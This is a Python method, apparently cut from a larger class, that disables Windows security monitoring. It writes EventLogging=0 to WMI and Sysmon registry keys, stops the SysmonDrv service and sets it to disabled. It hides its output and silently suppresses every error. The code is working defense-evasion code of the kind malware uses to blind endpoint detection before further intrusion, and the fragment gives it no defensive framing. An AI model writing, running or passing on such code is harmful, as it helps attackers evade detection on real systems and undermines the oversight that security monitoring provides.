    def disable_sysmon_wmi_events(self):
        
        
        try:
            
            wmi_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Wbem\CIMOM"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\WmiApRpl"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SysmonDrv")
            ]
            
            for hive, key_path in wmi_keys:
                try:
                    key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_ALL_ACCESS)
                    
                    winreg.SetValueEx(key, "EventLogging", 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(key)
                    self.debug_log(f'WMI event disabled: {key_path}')
                except Exception:
                    pass
            
            
            try:
                subprocess.run(['sc', 'stop', 'SysmonDrv'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['sc', 'config', 'SysmonDrv', 'start=', 'disabled'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.debug_log('Sysmon service disabled')
            except Exception:
                pass
                
        except Exception as e:
            self.debug_log(f'Sysmon/WMI disabled: {e}')

